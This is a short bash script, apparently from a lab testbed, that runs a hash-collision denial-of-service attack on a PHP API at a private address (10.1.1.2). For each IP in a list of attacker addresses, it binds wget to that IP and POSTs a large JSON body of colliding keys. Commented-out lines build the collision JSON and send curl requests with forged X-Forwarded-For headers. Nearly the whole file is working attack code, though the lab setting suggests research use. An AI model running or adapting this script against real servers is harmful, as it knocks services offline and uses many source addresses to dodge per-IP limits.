#!/bin/bash
input="collision_keys.txt"
inp="/proj/Leader/attacks/PySlowLoris/attackerIPs/10000/IPs_for_att_1"
i=0
#st="{"
#while IFS= read -r line
#do
#    i=$((i+1))
#    if [ "$i" -lt "10000" ]; then
#    st="${st} \"$line\":\"key$i\","
#
#    fi
#    if [ "$i" -gt "10000" ]; then
#	    st="${st} \"$line\":\"key$i\" }"
#	    break
#    fi
#done < "$input"
#
#echo $st
#exit

##while true
##do

while IFS= read -r add
do	
	  
          #curl --header "X-Forwarded-For: $add" -v -X POST \
	  #	  -H "Accept: application/json" \
	  #	  -H "Content-type: application/json" \
	  #	  -d '{"$line":"key1" }' \
	  #	   http://10.1.1.2/server/api.php
	  #echo "$add $line"
	  #wget --bind-address=$add  --post-data '{"4vq":"key1", "4wP2":"key2", "5Uq":"key3", "5VP":"key4", "64q":"key5" }' http://10.1.1.2/server/api.php 
	  wget --bind-address=$add --post-file=500k_json.txt --header=Content-Type:application/json http://10.1.1.2/server/api.php
	 rm api* 

done < "$inp"
  #rm api*
#done < "$input"

##done
